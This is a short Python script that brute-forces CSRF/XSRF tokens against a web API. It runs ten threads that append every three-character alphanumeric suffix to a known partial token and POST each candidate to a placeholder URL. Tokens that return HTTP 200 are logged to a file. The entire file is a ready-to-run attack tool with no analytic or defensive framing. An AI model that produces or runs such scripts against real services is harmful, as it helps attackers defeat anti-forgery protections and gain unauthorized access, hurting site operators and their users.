import requests
import itertools
import string
import threading
from queue import Queue
import time
from tqdm import tqdm

# Define the base URL and headers
url = "https://inputapiurlhere.com/api/v1"
headers = {
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest"
}

# Define the initial part of the token
initial_csrf_xsrf_token = "inputweaktokenhere"

# Define the characters to brute force
characters = string.ascii_letters + string.digits

# Queue to hold the tokens to be tested
token_queue = Queue()

# Function to attempt requests with brute forced tokens
def brute_force_csrf_xsrf_token(progress_bar):
    while not token_queue.empty():
        suffix = token_queue.get()
        token = initial_csrf_xsrf_token + ''.join(suffix)
        json_payload = {"csrf-xsrfToken": token}
        try:
            response = requests.post(url, headers=headers, json=json_payload)
            if response.status_code == 200:
                with open("valid_tokens.txt", "a") as log_file:
                    log_file.write(f"Valid token: {token}\n")
                    print(f"Found valid token: {token}")
        except requests.RequestException as e:
            print(f"Request failed: {e}")
        finally:
            token_queue.task_done()
            progress_bar.update(1)

# Fill the queue with all possible suffixes
suffix_combinations = list(itertools.product(characters, repeat=3))
for suffix in suffix_combinations:
    token_queue.put(suffix)

# Number of threads to use
num_threads = 10

# Create and start threads with progress bar
progress_bar = tqdm(total=len(suffix_combinations), desc="Brute forcing tokens")
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=brute_force_csrf_xsrf_token, args=(progress_bar,))
    t.start()
    threads.append(t)

# Wait for all threads to complete
for t in threads:
    t.join()
progress_bar.close()

print("Brute force completed.")